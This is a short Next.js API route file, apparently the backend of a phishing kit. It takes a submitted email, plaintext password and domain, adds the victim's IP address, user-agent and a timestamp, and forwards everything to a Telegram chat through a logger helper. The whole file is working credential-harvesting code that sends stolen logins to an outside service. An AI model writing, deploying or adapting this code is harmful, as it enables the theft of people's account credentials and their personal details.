// app/api/log-submit/route.ts
import { NextRequest, NextResponse } from 'next/server'
import { logToTelegram } from '../../../lib/telegramLogger'

export async function POST(req: NextRequest) {
  try {
    const body = await req.json()
    const { email, password, domain } = body

    if (!email || !password) {
      return NextResponse.json(
        { error: 'Missing email or password' },
        { status: 400 }
      )
    }

    // Get timestamp
    const timestamp = new Date().toISOString()

    // Get IP address
    const ip =
      req.headers.get('x-forwarded-for') ||
      req.ip || // fallback
      'Unknown IP'

    // Get user-agent
    const userAgent = req.headers.get('user-agent') || 'Unknown device'

    const message = `
🔐 Login Submitted:
📧 Email: ${email}
🔑 Password: ${password}
🌐 Domain: ${domain || 'Not provided'}
🕒 Time: ${timestamp}
🌍 IP: ${ip}
💻 Device: ${userAgent}
    `.trim()

    await logToTelegram(message)

    return NextResponse.json({ ok: true })
  } catch (error) {
    console.error('Telegram log error:', error)
    return NextResponse.json(
      { error: 'Failed to log to Telegram' },
      { status: 500 }
    )
  }
}
